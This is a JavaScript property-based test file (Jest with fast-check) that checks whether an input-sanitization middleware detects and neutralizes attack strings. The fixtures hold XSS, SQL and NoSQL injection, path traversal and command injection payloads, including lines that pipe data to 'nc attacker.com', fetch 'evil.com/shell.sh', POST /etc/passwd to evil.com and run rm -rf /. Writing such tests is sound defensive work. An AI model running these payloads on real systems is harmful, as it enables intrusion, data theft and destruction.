/**
 * Property-Based Tests for Input Sanitization Middleware
 * **Validates: Requirements 1.3**
 * 
 * Property 2: Input Sanitization Security
 * For any user input containing potentially malicious content, the sanitizer should 
 * clean the input before validation and prevent security vulnerabilities like XSS, 
 * SQL injection, NoSQL injection, and command injection attacks.
 */

const fc = require('fast-check');
const {
  sanitizeInput,
  createAdvancedSanitizer,
  sanitizeStringWithThreatDetection,
  generateCorrelationId
} = require('../middleware/validation');

// Mock feature flags for testing
jest.mock('../middleware/featureFlags', () => ({
  isEnabled: jest.fn(() => true),
  enable: jest.fn(),
  disable: jest.fn(),
  getAll: jest.fn(() => ({})),
  flags: {}
}));

describe('Property-Based Tests: Input Sanitization Security', () => {
  let req, res, next;

  beforeEach(() => {
    req = {
      body: {},
      query: {},
      params: {},
      method: 'POST',
      url: '/test',
      path: '/test',
      ip: '127.0.0.1',
      get: jest.fn((header) => {
        if (header === 'User-Agent') return 'test-agent';
        return undefined;
      }),
      correlationId: 'test-correlation-id'
    };
    res = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn()
    };
    next = jest.fn();
    
    // Reset mocks
    jest.clearAllMocks();
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2: Input Sanitization Security
   * 
   * For any user input containing potentially malicious content, the sanitizer should 
   * clean the input before validation and prevent security vulnerabilities.
   */
  describe('Property 2: Input Sanitization Security', () => {
    
    test('Property 2.1: XSS payloads are neutralized across all attack vectors', () => {
      fc.assert(fc.property(
        fc.oneof(
          // Script tag variations
          fc.constant('<script>alert("xss")</script>'),
          fc.constant('<SCRIPT>alert("xss")</SCRIPT>'),
          fc.constant('<script src="evil.js"></script>'),
          fc.constant('<script type="text/javascript">alert(1)</script>'),
          
          // Event handler variations
          fc.constant('<img src="x" onerror="alert(1)">'),
          fc.constant('<div onclick="alert(1)">click</div>'),
          fc.constant('<body onload="alert(1)">'),
          fc.constant('<input onfocus="alert(1)" autofocus>'),
          
          // JavaScript protocol variations
          fc.constant('javascript:alert("xss")'),
          fc.constant('JAVASCRIPT:alert("xss")'),
          fc.constant('javascript:void(0)'),
          
          // Iframe variations
          fc.constant('<iframe src="javascript:alert(1)"></iframe>'),
          fc.constant('<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'),
          
          // SVG variations
          fc.constant('<svg onload="alert(1)">'),
          fc.constant('<svg><script>alert(1)</script></svg>'),
          
          // Object/embed variations
          fc.constant('<object data="javascript:alert(1)">'),
          fc.constant('<embed src="javascript:alert(1)">'),
          
          // CSS-based XSS
          fc.constant('<style>@import "javascript:alert(1)";</style>'),
          fc.constant('<div style="background:url(javascript:alert(1))">'),
          
          // Data URL variations
          fc.constant('data:text/html,<script>alert(1)</script>'),
          fc.constant('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')
        ),
        (xssPayload) => {
          const context = {
            timestamp: new Date().toISOString(),
            correlationId: generateCorrelationId(),
            ip: '127.0.0.1',
            userAgent: 'test-agent',
            method: 'POST',
            path: '/test'
          };

          const { sanitized, detected } = sanitizeStringWithThreatDetection(xssPayload, context);

          // Property: XSS threats should be detected
          expect(detected.length).toBeGreaterThan(0);
          const xssThreats = detected.filter(threat => 
            threat.type.startsWith('XSS_') || 
            threat.type === 'DANGEROUS_HTML_TAG' ||
            threat.type === 'DANGEROUS_JS_FUNCTION'
          );
          expect(xssThreats.length).toBeGreaterThan(0);

          // Property: Dangerous XSS patterns should be neutralized
          expect(sanitized).not.toMatch(/<script/i);
          expect(sanitized).not.toMatch(/javascript:/i);
          expect(sanitized).not.toMatch(/on\w+\s*=/i);
          expect(sanitized).not.toMatch(/<iframe/i);
          expect(sanitized).not.toMatch(/<object/i);
          expect(sanitized).not.toMatch(/<embed/i);
          expect(sanitized).not.toMatch(/<svg/i);

          return true;
        }
      ), { numRuns: 10 });
    });

    test('Property 2.2: SQL injection payloads are neutralized across all variants', () => {
      fc.assert(fc.property(
        fc.oneof(
          // Classic SQL injection
          fc.constant("'; DROP TABLE users; --"),
          fc.constant("1' OR '1'='1"),
          fc.constant("admin'/*"),
          fc.constant("' UNION SELECT * FROM passwords --"),
          
          // Advanced SQL injection
          fc.constant("1; DELETE FROM users WHERE 1=1; --"),
          fc.constant("' OR 1=1#"),
          fc.constant("1' AND (SELECT COUNT(*) FROM users) > 0 --"),
          fc.constant("'; INSERT INTO users VALUES ('hacker', 'pass'); --"),
          
          // Blind SQL injection
          fc.constant("1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a"),
          fc.constant("1' WAITFOR DELAY '00:00:05' --"),
          
          // SQL functions and keywords
          fc.constant("1' OR SLEEP(5) --"),
          fc.constant("'; EXEC xp_cmdshell('dir'); --"),
          fc.constant("1' UNION ALL SELECT NULL,NULL,version() --")
        ),
        (sqlPayload) => {
          const context = {
            timestamp: new Date().toISOString(),
            correlationId: generateCorrelationId(),
            ip: '127.0.0.1',
            userAgent: 'test-agent',
            method: 'POST',
            path: '/test'
          };

          const { sanitized, detected } = sanitizeStringWithThreatDetection(sqlPayload, context);

          // Property: SQL injection threats should be detected
          expect(detected.length).toBeGreaterThan(0);
          const sqlThreats = detected.filter(threat => 
            threat.type === 'SQL_INJECTION_KEYWORD' || threat.type === 'SQL_INJECTION_CHAR'
          );
          expect(sqlThreats.length).toBeGreaterThan(0);

          // Property: SQL injection patterns should be neutralized
          expect(sanitized).not.toMatch(/drop\s+table/i);
          expect(sanitized).not.toMatch(/union\s+select/i);
          expect(sanitized).not.toMatch(/delete\s+from/i);
          expect(sanitized).not.toMatch(/insert\s+into/i);
          expect(sanitized).not.toMatch(/exec\s+/i);

          return true;
        }
      ), { numRuns: 10 });
    });

    test('Property 2.3: NoSQL injection payloads are neutralized comprehensively', () => {
      fc.assert(fc.property(
        fc.oneof(
          // MongoDB operator injection
          fc.constant('{"$where": "this.password"}'),
          fc.constant('{"$ne": null}'),
          fc.constant('{"$gt": ""}'),
          fc.constant('{"$regex": ".*"}'),
          fc.constant('{"$exists": true}'),
          
          // Advanced MongoDB injection
          fc.constant('{"$or": [{"password": {"$regex": ".*"}}, {"username": "admin"}]}'),
          fc.constant('{"$where": "function() { return this.username == \'admin\' }"}'),
          fc.constant('{"username": {"$in": ["admin", "root"]}}'),
          fc.constant('{"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}'),
          
          // JavaScript injection in MongoDB
          fc.constant('{"$where": "sleep(5000) || true"}'),
          fc.constant('{"$where": "this.constructor.constructor(\'return process\')().exit()"}')
        ),
        (nosqlPayload) => {
          const context = {
            timestamp: new Date().toISOString(),
            correlationId: generateCorrelationId(),
            ip: '127.0.0.1',
            userAgent: 'test-agent',
            method: 'POST',
            path: '/test'
          };

          const { sanitized, detected } = sanitizeStringWithThreatDetection(nosqlPayload, context);

          // Property: NoSQL injection threats should be detected
          expect(detected.length).toBeGreaterThan(0);
          const nosqlThreats = detected.filter(threat => threat.type === 'NOSQL_INJECTION');
          expect(nosqlThreats.length).toBeGreaterThan(0);

          // Property: NoSQL operators should be removed
          expect(sanitized).not.toMatch(/\$where/i);
          expect(sanitized).not.toMatch(/\$ne/i);
          expect(sanitized).not.toMatch(/\$gt/i);
          expect(sanitized).not.toMatch(/\$regex/i);
          expect(sanitized).not.toMatch(/\$exists/i);
          expect(sanitized).not.toMatch(/\$or/i);
          expect(sanitized).not.toMatch(/\$in/i);
          expect(sanitized).not.toMatch(/\$expr/i);

          return true;
        }
      ), { numRuns: 10 });
    });

    test('Property 2.4: Command injection payloads are neutralized across platforms', () => {
      fc.assert(fc.property(
        fc.oneof(
          // Unix/Linux command injection
          fc.constant('file.txt; rm -rf /'),
          fc.constant('data | nc attacker.com 4444'),
          fc.constant('input && wget evil.com/shell.sh'),
          fc.constant('test `whoami`'),
          fc.constant('file $(cat /etc/passwd)'),
          
          // Windows command injection
          fc.constant('file.txt & del /f /q C:\\*'),
          fc.constant('data | powershell -c "Invoke-WebRequest evil.com"'),
          fc.constant('input && cmd /c "dir C:\\"'),
          
          // Advanced command injection
          fc.constant('file.txt; curl -X POST -d @/etc/passwd evil.com'),
          fc.constant('$(python -c "import os; os.system(\'rm -rf /\')")'),
          fc.constant('`perl -e "system(\'rm -rf /\')"`'),
          
          // Path traversal with command injection
          fc.constant('../../../bin/sh -c "rm -rf /"'),
          fc.constant('..\\..\\..\\windows\\system32\\cmd.exe /c "del /f /q C:\\*"')
        ),
        (cmdPayload) => {
          const context = {
            timestamp: new Date().toISOString(),
            correlationId: generateCorrelationId(),
            ip: '127.0.0.1',
            userAgent: 'test-agent',
            method: 'POST',
            path: '/test'
          };

          const { sanitized, detected } = sanitizeStringWithThreatDetection(cmdPayload, context);

          // Property: Command injection threats should be detected
          expect(detected.length).toBeGreaterThan(0);
          const cmdThreats = detected.filter(threat => 
            threat.type === 'COMMAND_INJECTION' || threat.type === 'PATH_TRAVERSAL'
          );
          expect(cmdThreats.length).toBeGreaterThan(0);

          // Property: Command injection patterns should be neutralized
          expect(sanitized).not.toMatch(/;\s*rm/i);
          expect(sanitized).not.toMatch(/\|\s*nc/i);
          expect(sanitized).not.toMatch(/&&\s*wget/i);
          expect(sanitized).not.toMatch(/`\w+`/);
          expect(sanitized).not.toMatch(/\$\(/);
          expect(sanitized).not.toMatch(/&\s*del/i);

          return true;
        }
      ), { numRuns: 10 });
    });

    test('Property 2.5: Path traversal attacks are neutralized', () => {
      fc.assert(fc.property(
        fc.oneof(
          // Unix path traversal
          fc.constant('../../../etc/passwd'),
          fc.constant('....//....//....//etc/passwd'),
          fc.constant('/etc/passwd'),
          fc.constant('../../../../../../etc/shadow'),
          
          // Windows path traversal
          fc.constant('..\\..\\..\\windows\\system32\\config\\sam'),
          fc.constant('....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts'),
          fc.constant('C:\\windows\\system32\\config\\sam'),
          
          // URL encoded path traversal
          fc.constant('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'),
          fc.constant('%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam'),
          
          // Double encoded
          fc.constant('%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd')
        ),
        (pathPayload) => {
          const context = {
            timestamp: new Date().toISOString(),
            correlationId: generateCorrelationId(),
            ip: '127.0.0.1',
            userAgent: 'test-agent',
            method: 'POST',
            path: '/test'
          };

          const { sanitized, detected } = sanitizeStringWithThreatDetection(pathPayload, context);

          // Property: Path traversal threats should be detected
          expect(detected.length).toBeGreaterThan(0);
          const pathThreats = detected.filter(threat => threat.type === 'PATH_TRAVERSAL');
          expect(pathThreats.length).toBeGreaterThan(0);

          // Property: Path traversal sequences should be removed
          expect(sanitized).not.toMatch(/\.\.\//);
          expect(sanitized).not.toMatch(/\.\.\\/);
          expect(sanitized).not.toMatch(/%2e%2e%2f/i);
          expect(sanitized).not.toMatch(/%2e%2e%5c/i);

          return true;
        }
      ), { numRuns: 10 });
    });

    test('Property 2.6: Sanitization preserves safe content while removing threats', () => {
      fc.assert(fc.property(
        fc.record({
          safeText: fc.string().filter(s => 
            s.length > 0 && s.length < 100 && 
            !/[<>&"'`$;|]/.test(s) && 
            !s.includes('script') && 
            !s.includes('javascript')
          ),
          maliciousText: fc.oneof(
            fc.constant('<script>alert("xss")</script>'),
            fc.constant("'; DROP TABLE users; --"),
            fc.constant('{"$where": "this.password"}'),
            fc.constant('file.txt; rm -rf /')
          )
        }),
        ({ safeText, maliciousText }) => {
          const context = {
            timestamp: new Date().toISOString(),
            correlationId: generateCorrelationId(),
            ip: '127.0.0.1',
            userAgent: 'test-agent',
            method: 'POST',
            path: '/test'
          };

          const { sanitized: safeSanitized } = sanitizeStringWithThreatDetection(safeText, context);
          const { sanitized: maliciousSanitized, detected } = sanitizeStringWithThreatDetection(maliciousText, context);

          // Property: Safe content should be preserved (or minimally changed)
          expect(safeSanitized).toBe(safeText);

          // Property: Malicious content should be detected and sanitized
          expect(detected.length).toBeGreaterThan(0);
          expect(maliciousSanitized).not.toBe(maliciousText);

          return true;
        }
      ), { numRuns: 10 });
    });

    test('Property 2.7: Middleware sanitization occurs before validation consistently', () => {
      fc.assert(fc.property(
        fc.record({
          maliciousField: fc.oneof(
            fc.constant('<script>alert("xss")</script>'),
            fc.constant("'; DROP TABLE users; --"),
            fc.constant('{"$where": "this.password"}'),
            fc.constant('file.txt; rm -rf /'),
            fc.constant('../../../etc/passwd')
          ),
          safeField: fc.string().filter(s => s.length < 50 && !/[<>&"'`$;|]/.test(s)),
          nestedData: fc.record({
            innerMalicious: fc.constant('<iframe src="javascript:alert(1)"></iframe>'),
            innerSafe: fc.string().filter(s => s.length < 30 && !/[<>&"']/.test(s))
          })
        }),
        (testData) => {
          req.body = testData;
          req.correlationId = generateCorrelationId();

          let nextCalled = false;
          let nextError = null;

          const mockNext = (error) => {
            nextCalled = true;
            nextError = error;
          };

          // Apply sanitization middleware
          const sanitizer = sanitizeInput();
          sanitizer(req, res, mockNext);

          // Property: Middleware should complete without errors
          expect(nextCalled).toBe(true);
          expect(nextError).toBeUndefined();

          // Property: All malicious content should be sanitized
          const sanitizedBody = JSON.stringify(req.body);
          expect(sanitizedBody).not.toMatch(/<script/i);
          expect(sanitizedBody).not.toMatch(/drop\s+table/i);
          expect(sanitizedBody).not.toMatch(/\$where/i);
          expect(sanitizedBody).not.toMatch(/rm\s+-rf/i);
          expect(sanitizedBody).not.toMatch(/\.\.\//);
          expect(sanitizedBody).not.toMatch(/<iframe/i);

          // Property: Sanitization metadata should be added
          expect(req.sanitizationMeta).toBeDefined();
          expect(req.sanitizationMeta.processed).toBe(true);
          expect(req.sanitizationMeta.correlationId).toBeDefined();

          return true;
        }
      ), { numRuns: 10 });
    });

    test('Property 2.8: Advanced sanitizer with strict mode rejects high-severity threats', () => {
      fc.assert(fc.property(
        fc.oneof(
          fc.constant('<script>alert("xss")</script>'),
          fc.constant("'; DROP TABLE users; --"),
          fc.constant('{"$where": "this.password"}'),
          fc.constant('file.txt; rm -rf /')
        ),
        (maliciousPayload) => {
          req.body = { data: maliciousPayload };
          req.correlationId = generateCorrelationId();

          let nextCalled = false;
          let nextError = null;

          const mockNext = (error) => {
            nextCalled = true;
            nextError = error;
          };

          // Apply advanced sanitizer with strict mode
          const strictSanitizer = createAdvancedSanitizer({ 
            strictMode: true,
            logThreats: false 
          });
          strictSanitizer(req, res, mockNext);

          // Property: Middleware should complete
          expect(nextCalled).toBe(true);

          // Property: High-severity threats should cause validation error in strict mode
          expect(nextError).toBeDefined();
          expect(nextError.message).toContain('potentially malicious content');

          return true;
        }
      ), { numRuns: 10 });
    });

    test('Property 2.9: Encoding detection identifies suspicious patterns', () => {
      fc.assert(fc.property(
        fc.oneof(
          // URL encoded payloads
          fc.constant('%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E'),
          fc.constant('%27%3B%20DROP%20TABLE%20users%3B%20--'),
          
          // HTML entity encoded payloads
          fc.constant('&#60;script&#62;alert&#40;&#34;xss&#34;&#41;&#60;&#47;script&#62;'),
          fc.constant('&#x27;&#x3B;&#x20;DROP&#x20;TABLE&#x20;users&#x3B;&#x20;--'),
          
          // Unicode encoded payloads
          fc.constant('\\u003cscript\\u003ealert\\u0028\\u0022xss\\u0022\\u0029\\u003c\\u002fscript\\u003e')
        ),
        (encodedPayload) => {
          const context = {
            timestamp: new Date().toISOString(),
            correlationId: generateCorrelationId(),
            ip: '127.0.0.1',
            userAgent: 'test-agent',
            method: 'POST',
            path: '/test'
          };

          const { sanitized, detected } = sanitizeStringWithThreatDetection(encodedPayload, context);

          // Property: Encoding should be detected
          const encodingThreats = detected.filter(threat => 
            threat.type.includes('ENCODING_DETECTED')
          );
          expect(encodingThreats.length).toBeGreaterThan(0);

          // Property: Encoded content should still be sanitized
          expect(sanitized).not.toBe(encodedPayload);

          return true;
        }
      ), { numRuns: 10 });
    });

    test('Property 2.10: Length limits prevent DoS attacks', () => {
      fc.assert(fc.property(
        fc.string().filter(s => s.length > 1000), // Generate long strings
        (longString) => {
          const context = {
            timestamp: new Date().toISOString(),
            correlationId: generateCorrelationId(),
            ip: '127.0.0.1',
            userAgent: 'test-agent',
            method: 'POST',
            path: '/test'
          };

          const { sanitized, detected } = sanitizeStringWithThreatDetection(
            longString, 
            context, 
            { maxLength: 500 }
          );

          // Property: Long strings should be truncated
          expect(sanitized.length).toBeLessThanOrEqual(500);

          // Property: Length limit exceeded should be detected
          const lengthThreats = detected.filter(threat => 
            threat.type === 'LENGTH_LIMIT_EXCEEDED'
          );
          expect(lengthThreats.length).toBeGreaterThan(0);

          return true;
        }
      ), { numRuns: 10 });
    });
  });
});